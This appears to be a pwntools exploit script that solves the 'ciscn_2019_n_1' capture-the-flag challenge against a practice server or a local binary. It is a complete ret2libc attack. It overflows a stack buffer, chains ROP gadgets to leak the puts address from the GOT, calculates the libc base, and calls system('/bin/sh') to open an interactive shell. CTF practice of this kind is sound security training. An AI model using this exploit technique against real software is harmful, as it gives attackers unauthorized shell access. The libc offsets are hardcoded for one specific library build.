from pwn import *
import string
context.binary = './ciscn_2019_n_1'
context.log_level = 'debug'
context.timeout = None
elf = context.binary


if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20137)
	libc = ELF('../x64_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./ciscn_2019_n_1')

def dbg():
	raw_input()


pop_rdi = 0x0000000000400793 # pop rdi ; ret
pop_rsi = 0x0000000000400791 # pop rsi ; pop r15 ; ret
main = 0x400676

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

payload = 'a'*0x38 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)

#gdb.attach(p, 'b* 0x400AEE')
puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base+0x18cd57

gadget = 0x4526a + libc_base #0xf02a4 0xf1147 0x45216 0x4526a

payload = 'a'*0x38 + p64(pop_rdi) + p64(binsh) + p64(system_addr)
p.sendline(payload)
p.interactive()
p.close()